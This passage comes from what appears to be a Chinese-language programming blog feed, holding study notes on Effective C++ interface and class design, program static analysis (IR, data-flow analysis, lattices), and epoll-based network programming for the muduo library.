data-language="c"><code class="language-c">class Month<span class="token punctuation">&#123;</span>  public<span class="token operator">:</span>   <span class="token keyword">static</span> Month <span class="token function">Jan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">Month</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token keyword">static</span> Month <span class="token function">Feb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">Month</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span>Date <span class="token function">d</span><span class="token punctuation">(</span>Month<span class="token operator">::</span><span class="token function">Mar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">Day</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">Year</span><span class="token punctuation">(</span><span class="token number">1955</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2、使得自己的types的行为和内置types一致"><a href="#2、使得自己的types的行为和内置types一致" class="headerlink" title="2、使得自己的types的行为和内置types一致"></a>2、使得自己的types的行为和内置types一致</h3><p>对于STL容器来说，这些接口都十分一致，这使得极其容易被调用。比如<code>string</code> 类型 和<code>vector</code>类型，都有<code>size</code>方法。</p><h3 id="3、阻止误用"><a href="#3、阻止误用" class="headerlink" title="3、阻止误用"></a>3、阻止误用</h3><p>如在条款13中引入了一个对象</p><pre class="language-c" data-language="c"><code class="language-c">Investment<span class="token operator">*</span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>为了避免资源泄露，这个返回的指针必须删除，那就开启了客户端两次犯错机会：没有删除指针，或删除同一个指针超过一次。<br>事实上，对于设计的较好的接口来说，其一般原则就是先发制人，如</p><pre class="language-c" data-language="c"><code class="language-c">std<span class="token operator">::</span>shared_ptr<span class="token operator">&lt;</span>Investment<span class="token operator">></span> <span class="token function">createInvestment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="4、shared-ptr-支持定制删除器"><a href="#4、shared-ptr-支持定制删除器" class="headerlink" title="4、shared_ptr 支持定制删除器"></a>4、shared_ptr 支持定制删除器</h3><p><code>shared_ptr</code>这个性质可以消除DLL问题，即对象在动态连接程序库（DLL）中被new创建，却在另一个DLL内被delete销毁。</p><p>如：一个DLL（A）对外暴露的接口函数入参是vector&amp;，功能是返回一个对象的列表。另一个DLL（B）在调用这个接口之后崩溃。</p><p>接口入参设计成vector本来是想利用STL容器变长的特点，结果聪明反被聪明误。vector在添加对象时，如果内部申请的内存空间不够存放新对象，则会重新申请内存。这就导致了从B传入的vector其实是在A中申请了内存，而在B中销毁，导致不正确地释放内存。</p><p>如果使用<code>shared_ptr</code>来包装参数，利用其引用计数及定制析构的特性，保证内存哪里申请就哪里释放，就可以解决这个问题。</p><p>总结：</p><ul><li>好的接口总是不容易使用出错的，在编码过程中最好努力实现这些特性。</li><li>最好让自己的types的行为和内置types行为一致</li><li>阻止误用的方法：建立新类型，限制类型操作，束缚对象值，消除客户的资源管理责任。</li><li><code>shared_ptr</code> 支持定制删除器，可访问DLL问题和自动解除互斥锁。</li></ul><h2 id="条款19-设计class像设计type"><a href="#条款19-设计class像设计type" class="headerlink" title="条款19 设计class像设计type"></a>条款19 设计class像设计type</h2><p>类的设计就是类型设计，当你定义一个类之前，需要面对这些问题：</p><ul><li>这个新的类型如何创建和销毁？new还是new []？</li><li>初始化和赋值之间又怎样的区别？它们确实是不同的函数调用，参见：条款4</li><li>如果该类型的对象被传值而不是传引用，意味着怎样的语义？记住：传值时调用的是拷贝构造函数！</li><li>该类型合理的取值范围是？在类的成员函数、赋值和构造函数中需要做相应的范围检查！</li><li>你的新类型能融合到继承图中吗？如果你继承自已有的类，你的类将被它们限制（尤其是虚函数限定）；如果你希望其他类来继承该类型，那么你的方法是否需要声明为virtual？尤其是析构函数。</li><li>你的新类型允许怎样的类型转换？你可能需要将构造函数声明为explicit来避免隐式类型转换。参见：条款15：资源管理类需要提供对原始资源的访问</li><li>哪些运算符对你的新类型是有意义的？参见：条款 6：禁用那些不需要的缺省方法</li><li>谁可以访问你的成员方法？私有、保护、共有成员限定符；友元类、友元函数。</li><li>你想提供哪些潜在的接口？它们往往关乎异常安全、效率、资源使用等，这些潜在的接口将会影响你的实现。</li><li>你的类型有多么通用？如果它是非常通用的类型，你可以考虑通过模板把它定义成一系列的类。</li><li>你真的需要这个新的类型吗？如果你为了扩展一个类而继承了它，那么定义一个非成员函数或者模板能否更好地解决问题？</li></ul><p>总结：<br><code>class</code>设计就是<code>type</code>设计，需要考虑上述问题。</p><h2 id="条款20-传递常量引用比传值更好"><a href="#条款20-传递常量引用比传值更好" class="headerlink" title="条款20 传递常量引用比传值更好"></a>条款20 传递常量引用比传值更好</h2><p>//mutable volatile<br>//3.6 测试一下<br>//列表初始化逻辑</p><p>//除了函数中的静态对象是本地的，其他都是非本地的。-&gt;本体<br>和非本地命名冲突</p><p>//浅拷贝，深拷贝</p><p>//右值</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Program Static Analysis Note</title>
      <link href="/2022/03/30/Program-Static-Analysis-Note/"/>
      <url>/2022/03/30/Program-Static-Analysis-Note/</url>
      
        <content type="html"><![CDATA[<h1 id="静态分析笔记"><a href="#静态分析笔记" class="headerlink" title="静态分析笔记"></a>静态分析笔记</h1><span id="more"></span><h2 id="1-定义介绍"><a href="#1-定义介绍" class="headerlink" title="1 定义介绍"></a>1 定义介绍</h2><p>静态分析：抽象 + 过近似(Over-approximate)</p><p>sound: Over-approximate 将所有可能的程序行为均包括（大于）。</p><p>complete: Under-approximate 所有包含的程序行为都是程序运行的。</p><p>false negatives: 漏报</p><p>false positives: 误报</p><h2 id="2-IR"><a href="#2-IR" class="headerlink" title="2 IR"></a>2 IR</h2><h3 id="1-编译器和静态分析"><a href="#1-编译器和静态分析" class="headerlink" title="1. 编译器和静态分析"></a>1. 编译器和静态分析</h3><p>源码-&gt;（Scanner - 词法Lexical分析-Regular Expression）-&gt;（Parser- 语法Syntax分析-Context-Free Grammar）， 生成AST -&gt;（Type Checker - 语义Semantic分析 - Attribute Grammar），生成 Decorated AST -&gt; Translator，生成IR，进行静态分析 -&gt; Code Generator<br><img src="IR_compiler.png" alt="compiler"></p><h3 id="2-AST-vs-IR"><a href="#2-AST-vs-IR" class="headerlink" title="2. AST vs. IR"></a>2. AST vs. IR</h3><p>AST: 高级，更接近于语法结构，依赖于语言种类，适用于快速类型检查，缺少控制流信息</p><p>IR: 低级，更接近于机器码，不依赖语言种类，压缩且简洁，包含控制流信息。是静态分析的基础</p><h3 id="3-3地址码（3AC）"><a href="#3-3地址码（3AC）" class="headerlink" title="3. 3地址码（3AC）"></a>3. 3地址码（3AC）</h3><pre class="language-none"><code class="language-none">a+b+3  -&gt; t1 &#x3D; a + b           t2 &#x3D; t1 + 3</code></pre><h3 id="4-SSA-静态单赋值"><a href="#4-SSA-静态单赋值" class="headerlink" title="4. SSA 静态单赋值"></a>4. SSA 静态单赋值</h3><p>定义：给每一个定义变量一个新的名字，传递到接下来的使用当中，每个变量有1个定义（赋值的目标变量）。</p><p><img src="IR_SSA.png" alt="SSA"></p><p>优点：唯一的变量名可以间接体现程序流信息，简化分析过程；清楚的Define-Use信息。</p><p>缺点：引入很多变量和phi-function；转换为机器码时效率变低（引入很多拷贝操作）。</p><h3 id="5-Basic-Blocks"><a href="#5-Basic-Blocks" class="headerlink" title="5. Basic Blocks"></a>5. Basic Blocks</h3><p>定义：只有1个开头入口和1个结尾出口的最长3-地址指令序列。</p><p>建立方法: </p><ol><li>第一条指令是入口;</li><li>任何跳转指令的目标地址是入口；</li><li>任何跟在跳转指令之后的指令是入口。</li><li>然后构造基本块，任何基本块包含1个入口指令和其接下来的指令。</li></ol><p><img src="IR_BB.png" alt="BB">   </p><h3 id="6-Control-Flow-Analysis（CFG）"><a href="#6-Control-Flow-Analysis（CFG）" class="headerlink" title="6. Control Flow Analysis（CFG）"></a>6. Control Flow Analysis（CFG）</h3><p>建立基本块之后，建立边的方法<br>建立方法：</p><ol><li>基本块A的结尾有跳转指令跳转到基本块B；</li><li>原始指令序列中，B紧跟着A，且A的结尾不是无条件跳转。</li><li>添加Entry / Exit：没有块跳转到该块 / 没有跳转到其他块。</li></ol><h2 id="3-数据流分析-Applications"><a href="#3-数据流分析-Applications" class="headerlink" title="3 数据流分析 Applications"></a>3 数据流分析 Applications</h2><h3 id="1-预备知识"><a href="#1-预备知识" class="headerlink" title="1. 预备知识"></a>1. 预备知识</h3><p>may analysis：输出可能正确的信息（需做over-approximation优化，才能成为Safe-approximation安全的近似，可以有误报-completeness），注意大多数静态分析都是may analysis</p><p>must analysis：输出必须正确的信息（需做under-approximation优化，才能成为Safe-approximation安全的近似，可以有漏报-soundness）</p><p>输入/输出状态：程序执行前/执行后的状态（本质就是抽象表达的数据的状态，如变量的状态）。</p><p>数据流分析的结果：最终得到，每一个程序点对应一个数据流值(data-flow value)，表示该点所有可能程序状态的一个抽象。例如，我只关心x、y的值，我就用抽象来表示x、y所有可能的值的集合（输入/输出的值域/约束），就代表了该程序点的程序状态。</p><ol><li>Forward Analysis前向分析：按程序执行顺序的分析。OUT[s]=fs(IN[s])，s-statement</li><li>Backward Analysis反向分析：逆向分析。IN[s]=fs(OUT[s])</li></ol><p>控制流约束：约束求解做的事情，推断计算输入到输出，或反向分析。</p><h3 id="2-Reaching-Definition-Analysis-may-analysis"><a href="#2-Reaching-Definition-Analysis-may-analysis" class="headerlink" title="2. Reaching Definition Analysis (may analysis)"></a>2. Reaching Definition Analysis (may analysis)</h3><p>问题定义：给变量v一个定义d（赋值），存在一条路径使得程序点p能够到达q，且在这个过程中不能改变v的赋值。</p><p>应用例子：检测未定义的变量，若v可达p且v没有被定义，则为未定义的变量。</p><p>抽象表示：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。</p><ol><li><p>公式分析：</p><p> Transfer Function ：$OUT[B] = gen_B \bigcup  (IN[B] - kill_B)$ ——怎么理解，就 是基于转换规则而得到。</p><p> 解释：基本块B的输出 = 块B内的所有变量v的定义（赋值/修改）语句 U （块B的输入 - 程序中其它所有定义了变量v的语句）。本质就是本块与前驱修改变量的语句 作用之和（去掉前驱的重复修改语句）。</p><p> Control Flow：$IN[B] = U_{p a_predecesso_of_B}Out[P]$ ——怎么理解，就是基于控制流而得到。</p><p> 解释：基本块B的输入 = 块B所有前驱块P的输出的并集。注意，所有前驱块意味着只要有一条路径能够到达块B，就是它的前驱，包括条件跳转与无条件跳转。</p></li><li><p>Algorithm</p><p>方法：首先所有基本块的OUT[B]初始化为空。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为程序中有循环存在，只要某块的OUT[B]变了，就意味着后继块的IN[B]变了）。</p><p><img src="DFA_A_RDA_A.png" alt=""></p></li><li><p>算法界限<br>$OUT[B] = gen_B \cup  (IN[B] - kill_B)$ ： $gen_B$和 $kill_B$是不变的，只有IN[B]在变化，所以说OUT[B]只会增加不会减少，n向量长度是有限的，所以最终肯定会停止。具体涉及到不动点证明，后续课程会讲解。</p></li></ol><h3 id="3-Live-Variables-Analysis-may-analysis"><a href="#3-Live-Variables-Analysis-may-analysis" class="headerlink" title="3. Live Variables Analysis (may analysis)"></a>3. Live Variables Analysis (may analysis)</h3><p>问题定义：某程序点p处的变量v，从p开始到exit块的CFG中是否有某条路径用到了v，如果用到了v，则v在p点为live，否则为dead。其中有一个隐含条件，在点p和引用点之间不能重定义v。</p><p>应用场景：可用于寄存器分配，如果寄存器满了，就需要替换掉不会被用到的变量。</p><p>抽象表示：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。</p><ol><li><p>公式分析</p><p>Control Flow：$OUT[B] = \cup_{a \, successor \, of \, B}IN[S]$</p><p>后向分析，只要有一条子路是live，父节点就是live</p><p>Transfer Function：$IN[B] = use_B \, \cup \, (OUT[B] - def_B)$</p><p>IN[B] = 本块中use出现在define之前的变量 U （OUT[B]出口的live情况 - 本块中出现了define的变量）。define指的是定义/赋值。</p></li><li><p>Algorithm</p><p>方法：首先初始化每个基本块的IN[B]为空集。遍历每一个基本块B，按以上两个公式计算块B的OUT[B]和IN[B]，只要这次遍历时有某个块的IN[B]发生变化，则重新遍历一次（因为有循环，只要某块的IN[B]变了，就意味前驱块的OUT[B]变了）。</p><p><img src="DFA_A_LVA_A.png" alt=""></p></li></ol><h3 id="4-Available-Expressions-Analysis-must-analysis"><a href="#4-Available-Expressions-Analysis-must-analysis" class="headerlink" title="4. Available Expressions Analysis (must analysis)"></a>4. Available Expressions Analysis (must analysis)</h3><p>问题定义：程序点p处的表达式x op y可用需满足2个条件，一是从entry到p点必须经过x op y，二是最后一次使用x op y之后，没有重定义操作数x、y。（如果重定义了x 或 y，如x = a op2 b，则原来的表达式x op y中的x或y就会被替代）。</p><p>应用场景：用于优化，检测全局公共子表达式。</p><p>抽象表示：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。</p><ol><li><p>公式分析<br>Transfer Function：$OUT[B] = gen_B \cup (IN[B] - kill_B)$</p><p>解释：genB—基本块B中所有新的表达式（并且在这个表达式之后，不能对表达式中出现的变量进行重定义）—&gt;加入到OUT；killB—从IN中删除变量被重新定义的表达式。</p><p>Control Flow：$IN[B] = \cap P_{\, a\,predecessor\,of\,B }OUT[P]$</p><p>理解：从entry到p点的所有路径都必须经过该表达式。</p></li><li><p>Algorithm<br>方法：首先将OUT[entry]初始化为空，所有基本块的OUT[B]初始化为1…1。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为有循环，只要某块的OUT[B]变了，就意味后继块的IN[B]变了）。</p><p><img src="DFA_A_AEA_A.png" alt=""></p></li></ol><h3 id="5-Analysis"><a href="#5-Analysis" class="headerlink" title="5. Analysis"></a>5. Analysis</h3><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available Expressions</th></tr></thead><tbody><tr><td>Domain</td><td>赋值语句</td><td>变量</td><td>表达式</td></tr><tr><td>Direction</td><td>forward</td><td>backward</td><td>forward</td></tr><tr><td>May/Must</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary</td><td>OUT[Entry]=    $\emptyset$</td><td>IN[Exit]=$\emptyset$</td><td>OUT[Entry]=$\emptyset$</td></tr><tr><td>Initialization</td><td>OUT[B]=$\empty$</td><td>IN[B]=$\empty$</td><td>OUT[B]=$\cap$</td></tr><tr><td>Transfer function</td><td>$OUT=gen U (IN - kill)$</td><td>same</td><td>same</td></tr><tr><td>Meet</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div><h2 id="4-数据流分析-Foundations"><a href="#4-数据流分析-Foundations" class="headerlink" title="4 数据流分析 Foundations"></a>4 数据流分析 Foundations</h2><h3 id="1-迭代算法-另一个角度"><a href="#1-迭代算法-另一个角度" class="headerlink" title="1. 迭代算法-另一个角度"></a>1. 迭代算法-另一个角度</h3><blockquote><p>本质：常见的数据流迭代算法，目的是通过迭代计算，最终得到一个稳定的不变的解。</p></blockquote><h3 id="2-偏序（Partial-Order）"><a href="#2-偏序（Partial-Order）" class="headerlink" title="2. 偏序（Partial Order）"></a>2. 偏序（Partial Order）</h3><p>定义： 给定偏序集$(P, \sqsubseteq)$，$\sqsubseteq$是集合P上的二元关系，若满足以下性质则为偏序集：</p><ul><li>$\forall x \in P, x \sqsubseteq x$ 自反性 Reflexivity</li><li>$\forall x,y \in P, x \sqsubseteq y \cap y \sqsubseteq x =&gt; x = y$ 反对称性 Antisymmetry</li><li>$\forall x,y,z \in P, x \sqsubseteq y \cap y \sqsubseteq z =&gt; x \sqsubseteq z$ 传递性 Transitivity</li></ul><p>例子：</p><ul><li>P是整数集，$\sqsubseteq$表示$\leq$，是偏序集；若$\sqsubseteq$表示&lt;，则显然不是偏序集。</li><li>P是英文单词集合，$\sqsubseteq$表示子串关系（可以存在两个元素不具有偏序关系，不可比性），是偏序集。 </li></ul><h3 id="3-上下界（Upper-and-Lower-Bounds）"><a href="#3-上下界（Upper-and-Lower-Bounds）" class="headerlink" title="3.上下界（Upper and Lower Bounds）"></a>3.上下界（Upper and Lower Bounds）</h3><p>定义：给定偏序集$(P, \sqsubseteq)$，且有P的子集$S \subseteq P$：</p><ul><li>$\forall x \in S , x \sqsubseteq u$, 其中$u \in P$，则u是子集S的上界 （注意，u并不一定属于S集）</li><li>$\forall x \in S,l \subseteq P$， 则l是S的下界</li></ul><p>最小上界：least upper bound（lub 或者称为join），用$⊔S$表示。上确界？</p><p>定义：对于子集S的任何一个上界u，均有$⊔S⊑u$。</p><p>最大下界：greatest lower bound（glb 或者称为meet），用$⊓S$  表示。下确界？</p><p>定义：对于子集S的任何一个下界l，均有$l⊑⊓S$。</p><p>性质：</p><ul><li>并非每个偏序集都有上下确界。</li><li>如果存在上下确界，则是唯一的。（传递性和反证法可证明）</li></ul><h3 id="4-格（Lattice），（半格）Semilattice，全格，格点积（Complete-and-Product-Lattice）"><a href="#4-格（Lattice），（半格）Semilattice，全格，格点积（Complete-and-Product-Lattice）" class="headerlink" title="4.格（Lattice），（半格）Semilattice，全格，格点积（Complete and Product Lattice）"></a>4.格（Lattice），（半格）Semilattice，全格，格点积（Complete and Product Lattice）</h3><h4 id="1-格"><a href="#1-格" class="headerlink" title="1. 格"></a>1. 格</h4><p>定义：给定一个偏序集$(P,⊑)$，$∀a,b∈P$，如果存在$a⊔b$和$a⊓b$，那么就称该偏序集为格。偏序集中的任意两个元素构成的集合均存在最小上界和最大下界，那么该 偏序集就是格。</p><h4 id="2-半格"><a href="#2-半格" class="headerlink" title="2. 半格"></a>2. 半格</h4><p>定义：给定一个偏序集(P,⊑)，∀a,b∈P：<br>当且仅当$a⊔b$存在（上确界），该偏序集叫做 join semilatice；</p><p>当且仅当$a⊓b$存在（下确界），该偏序集叫做 meet semilatice</p><h4 id="3-全格"><a href="#3-全格" class="headerlink" title="3. 全格"></a>3. 全格</h4><p>定义：对于格点 $(S, \sqsubseteq)$ （前提是格点）的任意子集S，$⊔S$上确界和$⊓S$下确界都存在，则为全格complete lattice。</p><p>符号：$\top = \sqcup P$ ，叫做top；$\perp = \sqcap  P$，叫做bottom。   </p><h3 id="5-单调性与不动点定理（Monotonicity-and-Fixed-Point-Theorem）"><a href="#5-单调性与不动点定理（Monotonicity-and-Fixed-Point-Theorem）" class="headerlink" title="5. 单调性与不动点定理（Monotonicity and Fixed Point Theorem）"></a>5. 单调性与不动点定理（Monotonicity and Fixed Point Theorem）</h3><p>目标问题：迭代算法一定会停止（到达不动点）吗？</p><ol><li>单调性<br>定义：函数f: $L \rightarrow L$，满足$∀x,y∈L，x⊑y⇒f(x)⊑f(y)$，则为单调的。</li><li>不动点理论<br>给定一个完全$lattice(L,⊑)$，如果f:$L→L$是单调的，并且L有限<br>那么我们能得到最小不动点，通过迭代：$f(⊥),f(f(⊥)),…,f_k(⊥)$直到找到最小的一个不动点。同理,能得到最大不动点，通过迭代：$f(⊤),f(f(⊤)),…,fk(⊤)$直到找到最大的一个不动点。</li></ol><h3 id="6-从lattice的角度看may-must分析"><a href="#6-从lattice的角度看may-must分析" class="headerlink" title="6. 从lattice的角度看may/must分析"></a>6. 从lattice的角度看may/must分析</h3><p>说明：may 和 must 分析算法都是从不安全到安全（是否安全取决于safe-aprroximate过程），从准确到不准确。<br><img src="lattice_may_must.png" alt=""></p><h4 id="1-may-分析"><a href="#1-may-分析" class="headerlink" title="1.may 分析"></a>1.may 分析</h4><p>以 Reaching Definitions分析为例：</p><ul><li><p>1.从 $\perp$ 开始，$\perp$ 表示所有定义都不可达，是不安全的结果（因为这个分析的应用目的是为了查错，查看变量是否需要初始化。首先在Entry中给每个变量一个假定义，标记所有变量为都为未初始化状态，表示所有的假定义都无法到达，说明所有变量在中间都进行了赋值，那就不需要对任何变量进行初始化，这是不安全的，可能导致未初始化错误）</p></li><li><p>2.$\top$表示所有Entry中的假定义都可达，从查错角度来说，需要对每个变量都进行初始化，非常安全！但是这句话没有用，我都要初始化的话还做这个分析干嘛？</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Static Analysis Note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>muduo 库学习</title>
      <link href="/2021/12/09/muduo-%E5%BA%93%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/09/muduo-%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="网络编程相关学习"><a href="#网络编程相关学习" class="headerlink" title="网络编程相关学习"></a>网络编程相关学习</h1><h2 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h2><h3 id="select、poll、epoll-区别"><a href="#select、poll、epoll-区别" class="headerlink" title="select、poll、epoll 区别"></a>select、poll、epoll 区别</h3><ul><li>调用函数</li><li>select和poll都是一个函数，epoll是一组函数</li><li>文件描述符数量<ul><li>select通过线性表描述文件描述符集合，文件描述符有上限，一般是1024，但可以修改源码，重新编译内核。在linux/posix_types.h头文件有这样的声明：<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__FD_SETSIZE</span>    <span class="token expression"><span class="token number">1024</span></span></span></code></pre>表示select最多同时监听1024个fd。</li><li>poll是链表描述，突破了文件描述符上限，最大可以打开文件的数目；</li><li>epoll通过红黑树描述，最大可以打开文件的数目，可以通过命令ulimit -n number修改，仅对当前终端有效</li></ul></li><li>将文件描述符从用户传给内核<ul><li>select和poll通过将所有文件描述符拷贝到内核态，每次调用都需要拷贝</li><li>epoll通过epoll_create建立一棵红黑树，通过epoll_ctl将要监听的文件描述符注册到红黑树上</li></ul></li><li>内核判断就绪的文件描述符<ul><li>select和poll通过遍历文件描述符集合，判断哪个文件描述符上有事件发生</li><li>epoll_create时，内核除了帮我们在epoll文件系统里建了个红黑树用于存储以后epoll_ctl传来的fd外，还会再建立一个list链表，用于存储准备就绪的事件，当epoll_wait调用时，仅仅观察这个list链表里有没有数据即可。</li><li>epoll是根据每个fd上面的回调函数(中断函数)判断，只有发生了事件的socket才会主动的去调用 callback函数，其他空闲状态socket则不会，若是就绪事件，插入list</li></ul></li><li>应用程序索引就绪文件描述符<ul><li>select/poll只返回发生了事件的文件描述符的个数，若知道是哪个发生了事件，同样需要遍历</li><li>epoll返回的发生了事件的个数和结构体数组，结构体包含socket的信息，因此直接处理返回的数组即可</li></ul></li><li>工作模式<ul><li>select和poll都只能工作在相对低效的LT模式下</li><li>epoll则可以工作在ET高效模式，并且epoll还支持EPOLLONESHOT事件，该事件能进一步减少可读、可写和异常事件被触发的次数。 </li></ul></li><li>应用场景<ul><li>当所有的fd都是活跃连接，使用epoll，需要建立文件系统，红黑书和链表对于此来说，效率反而不高，不如selece和poll</li><li>当监测的fd数目较小，且各个fd都比较活跃，建议使用select或者poll</li><li>当监测的fd数目非常大，成千上万，且单位时间只有其中的一部分fd处于就绪状态，这个时候使用epoll能够明显提升性能</li></ul></li></ul><h3 id="epoll接口"><a href="#epoll接口" class="headerlink" title="epoll接口"></a>epoll接口</h3><ul><li><p>int epoll_create(int size);<br>创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大。这个参数不同于select()中的第一个参数，给出最大监听的fd+1的值。需要注意的是，当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close()关闭，否则可能导致fd被耗尽。</p></li><li><p>int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);<br>epoll的事件注册函数，它不同与select()是在监听事件时告诉内核要监听什么类型的事件，而是在这里先注册要监听的事件类型。第一个参数是epoll_create()的返回值，第二个参数表示动作，用三个宏来表示：</p><ul><li>EPOLL_CTL_ADD：注册新的fd到epfd中；</li><li>EPOLL_CTL_MOD：修改已经注册的fd的监听事件；</li><li>EPOLL_CTL_DEL：从epfd中删除一个fd；</li></ul><p>第三个参数是需要监听的fd，第四个参数是告诉内核需要监听什么事，struct epoll_event结构如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">union</span> epoll_data <span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>  __uint32_t u32<span class="token punctuation">;</span>  __uint64_t u64<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">epoll_data_t</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">epoll_event</span> <span class="token punctuation">&#123;</span>    __uint32_t events<span class="token punctuation">;</span> <span class="token comment">/* Epoll events */</span>    <span class="token class-name">epoll_data_t</span> data<span class="token punctuation">;</span> <span class="token comment">/* User data variable */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>events可以是以下几个宏的集合：</p><ul><li>EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；</li><li>EPOLLOUT：表示对应的文件描述符可以写；</li><li>EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；</li><li>EPOLLERR：表示对应的文件描述符发生错误；</li><li>EPOLLHUP：表示对应的文件描述符被挂断；</li><li>EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。</li><li>EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里</li><li>EPOLLRDHUP：代表对端断开连接，可以使得对端断开连接的异常在底层进行处理了，不用再移交到上层。</li></ul></li><li>int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);<br>等待事件的产生，类似于select()调用。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。<h3 id="ET、LT、EPOLLONESHOT"><a href="#ET、LT、EPOLLONESHOT" class="headerlink" title="ET、LT、EPOLLONESHOT"></a>ET、LT、EPOLLONESHOT</h3></li><li>LT水平触发模式<ul><li>epoll_wait检测到文件描述符有事件发生，则将其通知给应用程序，应用程序可以不立即处理该事件。</li><li>当下一次调用epoll_wait时，epoll_wait还会再次向应用程序报告此事件，直至被处理</li></ul></li><li>ET边缘触发模式<ul><li>epoll_wait检测到文件描述符有事件发生，则将其通知给应用程序，应用程序必须立即处理该事件</li><li>必须要一次性将数据读取完，使用非阻塞I/O，读取到出现eagain</li></ul></li><li>EPOLLONESHOT<ul><li>一个线程读取某个socket上的数据后开始处理数据，在处理过程中该socket上又有新数据可读，此时另一个线程被唤醒读取，此时出现两个线程处理同一个socket</li><li>一个socket连接在任一时刻都只被一个线程处理：通过epoll_ctl对该文件描述符注册epolloneshot事件，一个线程处理socket时，其他线程将无法处理，<strong>当该线程处理完后，需要通过epoll_ctl重置epolloneshot事件</strong></li></ul></li></ul><h2 id="处理非活跃链接"><a href="#处理非活跃链接" class="headerlink" title="处理非活跃链接"></a>处理非活跃链接</h2><ul><li>非活跃：指客户端（这里是浏览器）与服务器端建立连接后，长时间不交换数据，一直占用服务器端的文件描述符，导致连接资源的浪费。</li><li>定时事件：指固定一段时间之后触发某段代码，由该段代码处理一个事件，如从内核事件表删除事件，并关闭文件描述符，释放连接资源。</li><li>定时器，是指利用结构体或其他形式，将多种定时事件进行封装起来。这里只涉及一种定时事件，即定期检测非活跃连接，这里将该定时事件与连接资源封装为一个结构体定时器。</li><li>定时器容器，是指使用某种容器类数据结构，将上述多个定时器组合起来，便于对定时事件统一管理。具体的，项目中使用升序链表将所有定时器串联组织起来。</li></ul><h3 id="定时方法"><a href="#定时方法" class="headerlink" title="定时方法"></a>定时方法</h3><p>在tinyWebserver项目中，服务器主循环为每一个连接创建一个定时器，并对每个连接进行定时。另外，利用升序时间链表容器将所有定时器串联起来，若主循环接收到定时通知，则在链表中依次执行定时任务。<br>Linux下有三种定时方法：</p><ul><li>socket选项SO_RECVTIMEO和SO_SNDTIMEO</li><li>SIGALRM信号</li><li>I/O复用系统调用的超时参数</li></ul><p>项目中使用的是SIGAKRAM信号</p><h3 id="相关api"><a href="#相关api" class="headerlink" title="相关api"></a>相关api</h3><h4 id="sigaction结构体"><a href="#sigaction结构体" class="headerlink" title="sigaction结构体"></a>sigaction结构体</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sigaction</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">/* Signal handler.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined __USE_POSIX199309 <span class="token operator">||</span> defined __USE_XOPEN_EXTENDED</span></span>    <span class="token keyword">union</span>      <span class="token punctuation">&#123;</span><span class="token comment">/* Used if SA_SIGINFO is not set.  */</span>__sighandler_t sa_handler<span 